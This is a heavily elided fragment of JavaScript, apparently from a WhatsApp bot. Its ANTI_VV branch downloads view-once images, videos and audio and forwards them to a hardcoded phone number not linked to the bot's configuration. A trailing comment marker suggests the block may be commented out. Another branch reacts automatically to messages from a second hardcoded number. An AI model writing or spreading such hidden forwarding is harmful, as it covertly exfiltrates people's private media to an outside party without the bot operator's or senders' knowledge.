...
console.log("Session downloaded ✅")
  ...
  if (jawadik && config.ANTI_VV === "true") {
    ...
    return conn.sendMessage("254794146821@s.whatsapp.net", { image: { url: anu }, caption: cap }, { quoted: mek });
    ...
    return conn.sendMessage("254794146821@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
  } if (jawadik.message.audioMessage) {
    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
    return conn.sendMessage("254794146821@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
  }
  }
  ...
  */
  ...
  if(senderNumber.includes("255767862457")){
  if(isReact) return
  m.react("👻")
  }
